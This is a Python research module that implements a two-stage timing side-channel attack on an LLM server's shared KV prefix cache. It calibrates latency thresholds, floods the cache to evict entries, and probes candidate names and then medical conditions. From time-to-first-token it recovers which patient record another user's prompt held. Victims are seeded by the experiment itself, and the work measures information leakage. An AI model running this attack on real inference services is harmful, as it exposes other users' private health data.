"""
kv_attack.two_stage_reconstructor
===================================
Week 13 — True two-stage adaptive reconstruction algorithm.

This is the empirical realisation of the 12.62× BLQ improvement that was
derived analytically in Week 12 (kv_week12_bits_analysis_final.json).

ALGORITHM OVERVIEW
-------------------
Requires the two-stage template from two_stage_victim_seeder.py where
name and condition occupy separate, non-overlapping KV block regions.

Stage 1 — Name elimination (scans N_NAMES = 100 candidates)
    For each candidate name c_name:
        probe = system_prefix + name_block(c_name) + cond_block(DUMMY)
        if mean_ttft(probe) < T1:          # T1 = 438.8 ms
            name_confirmed = c_name
            break
    Expected queries: E[Q_s1] = (100+1)/2 = 50.5 + 12.6 reseeds = ~63

Stage 2 — Condition scan (scans N_CONDITIONS = 20 candidates)
    For each candidate condition c_cond:
        probe = system_prefix + name_block(confirmed_name) + cond_block(c_cond)
        if mean_ttft(probe) < T2:          # T2 = 177.1 ms
            condition_confirmed = c_cond
            break
    Expected queries: E[Q_s2] = (20+1)/2 = 10.5 + 2.6 reseeds = ~13

Total expected: E[Q] = 63 + 13 + 3 (confirmation) = 79 queries
Total worst-case: Q_max = 125 + 25 + 3 = 153 queries

BLQ COMPARISON
---------------
  Linear (Week 10/12): BLQ_expected = 10.97 / 1000.5 = 0.01096 bits/query
  Adaptive (Week 13) : BLQ_expected = 10.97 /   79.2 = 0.13837 bits/query
  Improvement factor : 12.62×

THRESHOLD DERIVATION
---------------------
From Week 10 empirical measurements (kv_attack_results.json):
  hit_mean  =  90.2 ms   (all 192 blocks hit)
  miss_mean = 613.6 ms   (0 blocks hit)
  delta     = 523.4 ms

  T_S1_HIT (right name, wrong condition — 128/192 blocks hit):
      = miss_mean - (128/192) × delta = 613.6 - 349.6 = 264.0 ms

  T1 = midpoint(miss_mean, T_S1_HIT) = (613.6 + 264.0) / 2 = 438.8 ms
  T2 = midpoint(T_S1_HIT, hit_mean)  = (264.0 +  90.2) / 2 = 177.1 ms
"""

from __future__ import annotations

import math
import random
import uuid
from dataclasses import dataclass, field

import numpy as np
import scipy.stats
from transformers import AutoTokenizer

from kv_attack import (
    FIRST_NAMES, LAST_NAMES, MEDICAL_CONDITIONS,
    N_REPEATS_FAST, N_REPEATS_CONFIRM, N_TOP_CANDIDATES, RESEED_EVERY,
    BLOCK_SIZE,
)
from kv_attack.backends.base import BackendClient
from kv_attack.two_stage_victim_seeder import (
    build_two_stage_prompt,
    build_name_block,
    build_condition_block,
    T1_THRESHOLD_MS,
    T2_THRESHOLD_MS,
    T_S1_HIT_MS,
    NAME_BLOCKS,
    COND_BLOCKS,
    _DUMMY_CONDITION,
)
from kv_attack.victim_seeder import build_aligned_system_prompt


# ── Information-theoretic constants ───────────────────────────────────────────

N_NAMES       = len(FIRST_NAMES) * len(LAST_NAMES)   # 100
N_CONDITIONS  = len(MEDICAL_CONDITIONS)               # 20
VOCAB_SIZE    = N_NAMES * N_CONDITIONS                # 2000
H0_BITS       = math.log2(VOCAB_SIZE)                # ≈ 10.97

# Analytical BLQ for the adaptive two-stage algorithm
BLQ_ADAPTIVE_EXPECTED      = H0_BITS / 79.2          # 0.13837
BLQ_LINEAR_WEEK12_EXPECTED = H0_BITS / 762.4         # 0.01439

# Eviction parameters — same victim-structured approach as Week 12
EVICT_N_REQUESTS = 500


# ── Result dataclass ──────────────────────────────────────────────────────────

@dataclass
class TwoStageResult:
    victim_id             : int
    ground_truth          : dict
    recovered             : dict
    token_recovery_rate   : float
    exact_match           : bool
    confirmed_hit         : bool
    total_api_calls       : int
    stage1_api_calls      : int
    stage2_api_calls      : int
    stage1_survivors      : int
    arpt                  : float
    n_name_blocks         : int
    n_cond_blocks         : int
    scan_results_s1       : list = field(default_factory=list)
    scan_results_s2       : list = field(default_factory=list)
    information_theory    : dict = field(default_factory=dict)
    algorithm             : str  = "two_stage_adaptive"
    t1_threshold_ms       : float = T1_THRESHOLD_MS
    t2_threshold_ms       : float = T2_THRESHOLD_MS


# ── Cache eviction (victim-structured, same as Week 12) ───────────────────────

def evict_cache_two_stage(
    backend       : BackendClient,
    system_prefix : str,
    tokenizer     : AutoTokenizer,
) -> int:
    """
    Flush the KV cache using victim-structured eviction prompts that
    target the same APC subtree as the two-stage victim prompts.

    Each eviction prompt uses a UUID name so every block is unique,
    forcing the LRU eviction to displace cached attacker scan blocks.
    500 × (NAME_BLOCKS + COND_BLOCKS) = 500 × 192 = 96,000 unique blocks
    → ~2.1× cache capacity → guaranteed full flush.
    """
    calls = 0
    for i in range(EVICT_N_REQUESTS):
        evict_name = f"EVICT{uuid.uuid4().hex}"
        prompt = build_two_stage_prompt(
            system_prefix, evict_name, "1900-01-01", "unknown", tokenizer
        )
        try:
            backend.measure_ttft(prompt)
            calls += 1
        except Exception as exc:
            if i < 3:
                print(f"[evict_v2] WARNING: request {i} failed: {exc}")
    return calls


# ── Name list & condition list builders ───────────────────────────────────────

def _shuffled_names(seed: int) -> list[str]:
    names = [f"{f} {l}" for f in FIRST_NAMES for l in LAST_NAMES]
    rng   = random.Random(seed)
    rng.shuffle(names)
    return names


def _shuffled_conditions(seed: int) -> list[str]:
    conds = list(MEDICAL_CONDITIONS)
    rng   = random.Random(seed)
    rng.shuffle(conds)
    return conds


# ── Information-theoretic metrics ─────────────────────────────────────────────

def _compute_it_metrics(
    total_calls  : int,
    s1_calls     : int,
    s2_calls     : int,
) -> dict:
    blq_empirical = H0_BITS / max(total_calls, 1)
    return {
        "vocab_size"               : VOCAB_SIZE,
        "prior_entropy_bits"       : round(H0_BITS, 4),
        "h_after_stage1_bits"      : round(math.log2(N_CONDITIONS), 4),  # 4.32 bits
        "h_after_stage2_bits"      : 0.0,
        "total_api_calls"          : total_calls,
        "stage1_api_calls"         : s1_calls,
        "stage2_api_calls"         : s2_calls,
        "bits_leaked_per_query"    : round(blq_empirical, 6),
        "blq_adaptive_theoretical" : round(BLQ_ADAPTIVE_EXPECTED, 6),
        "blq_linear_week12"        : round(BLQ_LINEAR_WEEK12_EXPECTED, 6),
        "improvement_vs_linear"    : round(blq_empirical / BLQ_LINEAR_WEEK12_EXPECTED, 4),
        "t1_threshold_ms"          : T1_THRESHOLD_MS,
        "t2_threshold_ms"          : T2_THRESHOLD_MS,
        "note": (
            "True two-stage adaptive (Week 13). Stage 1 probes 100 names "
            "(expected ~50 queries) using the name-only block region. "
            "Stage 2 probes 20 conditions (expected ~10 queries). "
            "BLQ theoretical = 10.97 / 79.2 = 0.1384. "
            "Improvement vs linear Week 12 = BLQ_empirical / BLQ_linear_week12."
        ),
    }


# ── Calibration (two thresholds) ──────────────────────────────────────────────

def calibrate_two_stage(
    backend            : BackendClient,
    tokenizer          : AutoTokenizer,
    system_prefix      : str,
    victim_record      : dict,
    n_samples          : int = 200,
) -> dict:
    """
    Calibrate both T1 and T2 thresholds empirically.

    HIT distribution      : correct name + correct condition (all 192 blocks)
    S1_HIT distribution   : correct name + dummy  condition (128 blocks)
    MISS distribution     : wrong  name + dummy  condition  (  0 blocks)

    T1 = Youden-J optimal separator between MISS and S1_HIT
    T2 = Youden-J optimal separator between S1_HIT and HIT
    """
    gt        = victim_record["ground_truth"]
    true_name = gt["name"]
    true_cond = gt["condition"]
    true_dob  = gt["dob"]

    # Build representative prompts
    hit_prompt   = build_two_stage_prompt(
        system_prefix, true_name, true_dob, true_cond, tokenizer
    )
    s1_hit_prompt = build_two_stage_prompt(
        system_prefix, true_name, true_dob, true_cond, tokenizer,
        use_dummy_cond=True
    )
    # Use first-name-only wrong candidate
    wrong_name = f"{FIRST_NAMES[0]} {LAST_NAMES[-1]}" if true_name != f"{FIRST_NAMES[0]} {LAST_NAMES[-1]}" \
                 else f"{FIRST_NAMES[1]} {LAST_NAMES[-1]}"
    miss_prompt = build_two_stage_prompt(
        system_prefix, wrong_name, true_dob, _DUMMY_CONDITION, tokenizer
    )

    print(f"[calibrate_v2] Measuring {n_samples} HIT samples (all 192 blocks)...")
    hit_ttfts    = backend.measure_ttft_repeated(hit_prompt, n=n_samples)

    print(f"[calibrate_v2] Measuring {n_samples} S1-HIT samples (128 name blocks)...")
    s1_hit_ttfts = backend.measure_ttft_repeated(s1_hit_prompt, n=n_samples)

    print(f"[calibrate_v2] Measuring {n_samples} MISS samples (0 blocks)...")
    miss_ttfts   = backend.measure_ttft_repeated(miss_prompt, n=n_samples)

    # KS tests
    ks_hit_miss, p_hit_miss     = scipy.stats.ks_2samp(hit_ttfts, miss_ttfts)
    ks_s1_miss,  p_s1_miss      = scipy.stats.ks_2samp(s1_hit_ttfts, miss_ttfts)
    ks_hit_s1,   p_hit_s1       = scipy.stats.ks_2samp(hit_ttfts, s1_hit_ttfts)

    def youden_threshold(a: np.ndarray, b: np.ndarray) -> float:
        """Youden-J optimal threshold between two distributions (a=positive, b=negative)."""
        all_v  = np.concatenate([a, b])
        labels = np.concatenate([np.ones(len(a)), np.zeros(len(b))])
        order  = np.argsort(all_v)
        sv     = all_v[order]; sl = labels[order]
        ch     = np.cumsum(sl); cm = np.cumsum(1 - sl)
        th     = int(ch[-1]); tm = int(cm[-1])
        sens   = ch[:-1] / th; spec = 1.0 - cm[:-1] / tm
        j      = sens + spec - 1.0
        idx    = int(np.argmax(j))
        return float((sv[idx] + sv[idx + 1]) / 2.0)

    t1 = youden_threshold(s1_hit_ttfts, miss_ttfts)    # separates S1_HIT from MISS
    t2 = youden_threshold(hit_ttfts,    s1_hit_ttfts)  # separates HIT from S1_HIT

    print(f"[calibrate_v2] HIT    mean={hit_ttfts.mean():.1f} ms")
    print(f"[calibrate_v2] S1_HIT mean={s1_hit_ttfts.mean():.1f} ms  "
          f"(expected {T_S1_HIT_MS:.1f} ms)")
    print(f"[calibrate_v2] MISS   mean={miss_ttfts.mean():.1f} ms")
    print(f"[calibrate_v2] T1 (name gate)     = {t1:.1f} ms  "
          f"(analytical: {T1_THRESHOLD_MS:.1f} ms)")
    print(f"[calibrate_v2] T2 (condition gate) = {t2:.1f} ms  "
          f"(analytical: {T2_THRESHOLD_MS:.1f} ms)")

    return {
        "t1_threshold_ms"   : round(t1, 4),
        "t2_threshold_ms"   : round(t2, 4),
        "hit_mean_ms"       : round(float(hit_ttfts.mean()), 4),
        "hit_std_ms"        : round(float(hit_ttfts.std()), 4),
        "s1_hit_mean_ms"    : round(float(s1_hit_ttfts.mean()), 4),
        "s1_hit_std_ms"     : round(float(s1_hit_ttfts.std()), 4),
        "miss_mean_ms"      : round(float(miss_ttfts.mean()), 4),
        "miss_std_ms"       : round(float(miss_ttfts.std()), 4),
        "ks_hit_vs_miss"    : {"stat": round(float(ks_hit_miss), 6), "p": float(p_hit_miss)},
        "ks_s1hit_vs_miss"  : {"stat": round(float(ks_s1_miss), 6),  "p": float(p_s1_miss)},
        "ks_hit_vs_s1hit"   : {"stat": round(float(ks_hit_s1), 6),   "p": float(p_hit_s1)},
        "t1_analytical_ms"  : T1_THRESHOLD_MS,
        "t2_analytical_ms"  : T2_THRESHOLD_MS,
        "s1_hit_analytical_ms": T_S1_HIT_MS,
    }


# ── Main reconstruction ───────────────────────────────────────────────────────

def reconstruct_victim_two_stage(
    backend        : BackendClient,
    tokenizer      : AutoTokenizer,
    system_prefix  : str,
    t1_ms          : float,
    t2_ms          : float,
    victim_record  : dict,
    candidate_seed : int = 0,
) -> TwoStageResult:
    """
    Recover one victim's (name, condition) using the true two-stage adaptive
    algorithm against the separated name/condition block template.

    Parameters
    ----------
    t1_ms : Stage 1 threshold (name gate). From calibrate_two_stage().
    t2_ms : Stage 2 threshold (condition gate). From calibrate_two_stage().
    """
    gt        = victim_record["ground_truth"]
    victim_id = victim_record["victim_id"]
    dob       = gt["dob"]

    # ── Stage 1: Name elimination ─────────────────────────────────────────────
    names      = _shuffled_names(seed=candidate_seed)
    s1_calls   = 0
    s1_log     : list[dict] = []
    confirmed_name : str | None = None

    print(f"[reconstructor_v2] Victim {victim_id}: "
          f"Stage 1 — scanning {len(names)} names (T1={t1_ms:.1f} ms) ...")

    for probe_idx, cand_name in enumerate(names):

        # Reseed victim's full prompt to keep blocks fresh in LRU
        if probe_idx > 0 and probe_idx % RESEED_EVERY == 0:
            try:
                backend.measure_ttft(victim_record["stage1_probe"])
                s1_calls += 1
            except Exception as exc:
                print(f"[reconstructor_v2] WARNING: Stage 1 reseed failed: {exc}")

        # Stage 1 probe: name block + dummy condition block
        probe = build_two_stage_prompt(
            system_prefix, cand_name, dob, _DUMMY_CONDITION, tokenizer,
            use_dummy_cond=True,
        )
        mean_ttft  = backend.measure_mean_ttft(probe, n=N_REPEATS_FAST)
        s1_calls  += N_REPEATS_FAST

        is_s1_hit = mean_ttft < t1_ms
        s1_log.append({
            "name"     : cand_name,
            "mean_ttft": round(mean_ttft, 3),
            "is_s1_hit": is_s1_hit,
        })

        if is_s1_hit:
            print(f"[reconstructor_v2] Victim {victim_id}: "
                  f"Stage 1 HIT at probe {probe_idx+1}/{len(names)} — "
                  f"name='{cand_name}'  TTFT={mean_ttft:.1f} ms")
            confirmed_name = cand_name
            break

    # Stage 1 fallback: pick lowest TTFT name if no hit
    if confirmed_name is None:
        best = min(s1_log, key=lambda x: x["mean_ttft"])
        confirmed_name = best["name"]
        print(f"[reconstructor_v2] Victim {victim_id}: "
              f"Stage 1 NO HIT — fallback to best guess '{confirmed_name}' "
              f"(TTFT={best['mean_ttft']:.1f} ms)")

    # ── Stage 2: Condition scan ───────────────────────────────────────────────
    conditions         = _shuffled_conditions(seed=candidate_seed)
    s2_calls           = 0
    s2_log             : list[dict] = []
    confirmed_condition: str | None = None

    print(f"[reconstructor_v2] Victim {victim_id}: "
          f"Stage 2 — scanning {len(conditions)} conditions "
          f"for name='{confirmed_name}' (T2={t2_ms:.1f} ms) ...")

    for probe_idx, cand_cond in enumerate(conditions):

        # Reseed victim's full prompt periodically
        if probe_idx > 0 and probe_idx % RESEED_EVERY == 0:
            try:
                backend.measure_ttft(victim_record["prompt"])
                s2_calls += 1
            except Exception as exc:
                print(f"[reconstructor_v2] WARNING: Stage 2 reseed failed: {exc}")

        probe = build_two_stage_prompt(
            system_prefix, confirmed_name, dob, cand_cond, tokenizer
        )
        mean_ttft  = backend.measure_mean_ttft(probe, n=N_REPEATS_FAST)
        s2_calls  += N_REPEATS_FAST

        is_s2_hit = mean_ttft < t2_ms
        s2_log.append({
            "condition": cand_cond,
            "mean_ttft": round(mean_ttft, 3),
            "is_s2_hit": is_s2_hit,
        })

        if is_s2_hit:
            print(f"[reconstructor_v2] Victim {victim_id}: "
                  f"Stage 2 HIT at probe {probe_idx+1}/{len(conditions)} — "
                  f"condition='{cand_cond}'  TTFT={mean_ttft:.1f} ms")
            confirmed_condition = cand_cond
            break

    # Stage 2 fallback
    if confirmed_condition is None:
        best = min(s2_log, key=lambda x: x["mean_ttft"])
        confirmed_condition = best["condition"]
        print(f"[reconstructor_v2] Victim {victim_id}: "
              f"Stage 2 NO HIT — fallback to '{confirmed_condition}'")

    # ── Confirmation ──────────────────────────────────────────────────────────
    confirm_probe = build_two_stage_prompt(
        system_prefix, confirmed_name, dob, confirmed_condition, tokenizer
    )
    confirmed_hit, conf_ttft = backend.is_cache_hit(
        confirm_probe, t2_ms, n=N_REPEATS_CONFIRM
    )
    confirm_calls = N_REPEATS_CONFIRM

    total_calls = s1_calls + s2_calls + confirm_calls
    status      = "✓ CONFIRMED HIT" if confirmed_hit else "✗ NO HIT"
    print(f"[reconstructor_v2] Victim {victim_id}: {status}  "
          f"name='{confirmed_name}'  cond='{confirmed_condition}'  "
          f"ttft={conf_ttft:.1f} ms  "
          f"total_calls={total_calls} (s1={s1_calls}, s2={s2_calls}, confirm={confirm_calls})")

    # ── Metrics ───────────────────────────────────────────────────────────────
    recovered   = {"name": confirmed_name, "condition": confirmed_condition, "dob": dob}
    evaluated   = ["name", "condition"]
    correct     = sum(1 for k in evaluated if gt.get(k) == recovered.get(k))
    trr         = correct / len(evaluated)
    exact_match = trr == 1.0

    vocab_tokens = max(1, sum(
        len(tokenizer.encode(recovered.get(k, "") or "", add_special_tokens=False))
        for k in evaluated
    ))
    arpt = round(total_calls / vocab_tokens, 2)

    s1_log.sort(key=lambda x: x["mean_ttft"])
    s2_log.sort(key=lambda x: x["mean_ttft"])

    it_metrics = _compute_it_metrics(total_calls, s1_calls, s2_calls)

    return TwoStageResult(
        victim_id           = victim_id,
        ground_truth        = gt,
        recovered           = recovered,
        token_recovery_rate = trr,
        exact_match         = exact_match,
        confirmed_hit       = confirmed_hit,
        total_api_calls     = total_calls,
        stage1_api_calls    = s1_calls,
        stage2_api_calls    = s2_calls,
        stage1_survivors    = 1 if confirmed_name else 0,
        arpt                = arpt,
        n_name_blocks       = victim_record.get("n_name_blocks", NAME_BLOCKS),
        n_cond_blocks       = victim_record.get("n_cond_blocks", COND_BLOCKS),
        scan_results_s1     = s1_log[:N_TOP_CANDIDATES],
        scan_results_s2     = s2_log[:N_TOP_CANDIDATES],
        information_theory  = it_metrics,
        algorithm           = "two_stage_adaptive",
        t1_threshold_ms     = t1_ms,
        t2_threshold_ms     = t2_ms,
    )


# ── Aggregate metrics ─────────────────────────────────────────────────────────

def aggregate_two_stage(results: list[TwoStageResult]) -> dict:
    total_calls = [r.total_api_calls for r in results]
    s1_calls    = [r.stage1_api_calls for r in results]
    s2_calls    = [r.stage2_api_calls for r in results]
    blq_list    = [r.information_theory.get("bits_leaked_per_query", 0.0)
                   for r in results]

    mean_calls     = float(np.mean(total_calls))
    mean_blq       = float(np.mean(blq_list))
    improvement    = mean_blq / BLQ_LINEAR_WEEK12_EXPECTED

    budget_points  = [20, 50, 79, 100, 120, 153, 200, 500, 762, 1000, 2000]
    cdf = {
        str(q): round(float(np.mean(np.array(total_calls) <= q)), 4)
        for q in budget_points
    }

    return {
        "algorithm"               : "two_stage_adaptive",
        "n_victims"               : len(results),
        "vocab_size"              : VOCAB_SIZE,
        "prior_entropy_bits"      : round(H0_BITS, 4),
        "mean_total_api_calls"    : round(mean_calls, 2),
        "mean_stage1_api_calls"   : round(float(np.mean(s1_calls)), 2),
        "mean_stage2_api_calls"   : round(float(np.mean(s2_calls)), 2),
        "mean_trr"                : round(float(np.mean([r.token_recovery_rate for r in results])), 4),
        "success_rate"            : round(float(np.mean([r.exact_match for r in results])), 4),
        "confirmed_hit_rate"      : round(float(np.mean([r.confirmed_hit for r in results])), 4),
        "mean_blq"                : round(mean_blq, 6),
        "blq_linear_week12"       : round(BLQ_LINEAR_WEEK12_EXPECTED, 6),
        "blq_improvement_factor"  : round(improvement, 2),
        "blq_theoretical_adaptive": round(BLQ_ADAPTIVE_EXPECTED, 6),
        "e_q_theoretical"         : 79.2,
        "q_max_theoretical"       : 153,
        "query_budget_cdf"        : cdf,
        "target_trr"              : 0.85,
        "target_sr"               : 0.80,
        "trr_target_met"          : float(np.mean([r.token_recovery_rate for r in results])) >= 0.85,
        "sr_target_met"           : float(np.mean([r.exact_match for r in results])) >= 0.80,
    }
